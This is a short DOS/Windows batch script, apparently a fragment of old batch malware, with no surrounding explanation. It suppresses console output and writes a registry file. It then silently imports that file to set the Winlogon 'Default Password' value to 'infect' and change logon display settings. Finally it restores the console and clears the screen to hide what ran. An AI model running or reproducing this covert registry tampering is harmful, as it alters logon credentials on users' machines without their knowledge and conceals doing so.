ctty nul
echo REGEDIT4>C:\t.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon]>>C:\t.reg
echo "Default Password"="infect">>C:\t.reg
echo "DontDisplayLastUserName"="0">>C:\t.reg
regedit /s C:\t.reg
rem del C:\t.reg
ctty con
cls
